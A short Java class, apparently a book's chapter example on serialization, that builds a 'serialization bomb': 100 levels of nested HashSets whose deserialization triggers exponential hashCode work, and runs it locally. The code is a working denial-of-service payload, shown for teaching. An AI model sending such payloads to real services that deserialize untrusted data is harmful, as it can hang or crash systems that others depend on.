package chapter12.item85;

import java.util.HashSet;
import java.util.Set;

public class SerializationBomb {
    private static byte[] bomb() {
        Set<Object> left = new HashSet<>();
        left.add("Bomb");

        Set<Object> right = new HashSet<>();

        Set<Object> root = new HashSet<>();
        root.add(left);
        root.add(right);

        for (int i = 0; i < 99; i++) {
            Set<Object> childLeft = new HashSet<>();
            Set<Object> childRight = new HashSet<>();

            childLeft.add("Bomb");

            left.add(childLeft);
            left.add(childRight);
            right.add(childLeft);
            right.add(childRight);

            left = childLeft;
            right = childRight;
        }

        return Serializers.serialize(root);
    }

    public static void main(String[] args) {
        Serializers.deserialize(bomb());
    }
}
